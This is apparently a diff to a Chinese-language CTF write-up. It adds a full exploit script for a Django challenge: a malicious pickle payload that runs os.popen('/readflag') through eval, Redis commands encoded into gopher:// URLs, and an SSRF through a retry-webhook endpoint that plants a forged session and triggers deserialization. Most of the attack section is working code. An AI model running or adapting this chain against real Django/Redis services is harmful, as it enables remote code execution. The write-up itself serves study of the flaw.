@@ -474,6 +474,8 @@ R                        REDUCE：调用 eval(args)
 后面我们请求这个/dashboard/这个api路径的时候把session的值改为我们伪造的session值，里面就会执行我们的反序话我们的payload，执行我们恶意的代码。
 
 
+
+
 ```python
 CMD = ("__import__('redis').Redis().set('pwn2',"
          "__import__('os').popen('/readflag').read())")
@@ -489,8 +491,109 @@ payload = pickle.dumps(E(), protocol=4)
 
 响应 **500**，但这不是失败 —— 500 是后面 session 类型不对导致的，**反序列化已经执行完了**。这个时候这个flag值已经写入了pwn2键值中。
 
+### 生成url的脚本
+`import pickle, urllib.parse, json`
+# `===== 1. 配置 =====`
+`sid = "pwnflag000000000000000000000001"`
+`key = f":1:django.contrib.sessions.cache{sid}"`
+# `==== 2. 恶意 pickle =====`
+`CMD = ("__import__('redis').Redis().set('pwn2',"`
+       `"__import__('os').popen('/readflag').read())")`
+
+`class E:`
+    `def __reduce__(self):`
+        `return (eval, (CMD,))`
+
+`payload = pickle.dumps(E(), protocol=4)`
+# `===== 3. RESP =====`
+`def resp(*args):`
+    `out = b"*%d\r\n" % len(args)`
+    `for a in args:`
+        `if isinstance(a, str):`
+            `a = a.encode()`
+        `out += b"$%d\r\n%s\r\n" % (len(a), a)`
+    `return out`
+# `写 session`
+`raw_write = (`
+    `resp("SELECT", "1")`
+    `+ resp("SET", key, payload)`
+    `+ resp("EXPIRE", key, "900")`
+`)`
+# `读回显`
+`raw_read = resp("GET", "pwn2")`
+# `===== 4. 完整 gopher URL =====`
+`url_write = "gopher://127.1:6379/_" + urllib.parse.quote_from_bytes(raw_write, safe="")`
+`url_read  = "gopher://127.1:6379/_" + urllib.parse.quote_from_bytes(raw_read, safe="")`
+`print(json.dumps({"url_write": url_write}, ensure_ascii=False))`
+`print(json.dumps({"url_read":  url_read},  ensure_ascii=False))`
 
 ```
 GET pwn2
 ```
 再用gopher协议请求就可以得到flag
+‘
+
+
+## 8. 完整利用脚本
+
+```python
+import json, pickle, urllib.parse, urllib.request
+
+BASE = "http://1.14.76.59:22316"
+COOKIE = "dp_session=<你的会话>"
+TASK = "<带 webhook_url 的 task_id>"
+
+def post(path, body, timeout=8):
+    req = urllib.request.Request(
+        BASE + path, data=json.dumps(body).encode(),
+        headers={"Content-Type": "application/json", "Cookie": COOKIE})
+    try:
+        r = urllib.request.urlopen(req, timeout=timeout)
+        return r.status, r.read().decode()
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode()
+    except Exception as e:
+        return None, f"ERR {e}"
+
+def resp(*args):
+    out = b"*%d\r\n" % len(args)
+    for a in args:
+        if isinstance(a, str):
+            a = a.encode()
+        out += b"$%d\r\n%s\r\n" % (len(a), a)
+    return out
+
+def redis(*cmds, timeout=8):
+    raw = b"".join(resp(*c) for c in cmds)
+    url = "gopher://127.1:6379/_" + urllib.parse.quote_from_bytes(raw, safe="")
+    s, b = post(f"/tasks/{TASK}/retry-webhook/", {"url": url}, timeout=timeout)
+    try:
+        return json.loads(b).get("log", {}).get("response_body", "")
+    except Exception:
+        return b
+
+# 1) 恶意 pickle
+CMD = ("__import__('redis').Redis().set('pwn2',"
+       "__import__('os').popen('/readflag').read())")
+class E:
+    def __reduce__(self):
+        return (eval, (CMD,))
+payload = pickle.dumps(E(), protocol=4)
+
+# 2) 写入 session 缓存
+sid = "pwnflag000000000000000000000001"
+key = f":1:django.contrib.sessions.cache{sid}"
+print(redis(("SELECT", "1"), ("SET", key, payload), ("EXPIRE", key, "900")))
+
+# 3) 触发反序列化
+req = urllib.request.Request(BASE + "/dashboard/",
+                             headers={"Cookie": f"dp_session={sid}"})
+try:
+    urllib.request.urlopen(req, timeout=8)
+except Exception:
+    pass
+
+# 4) 回读
+print(redis(("GET", "pwn2")))
+```
+
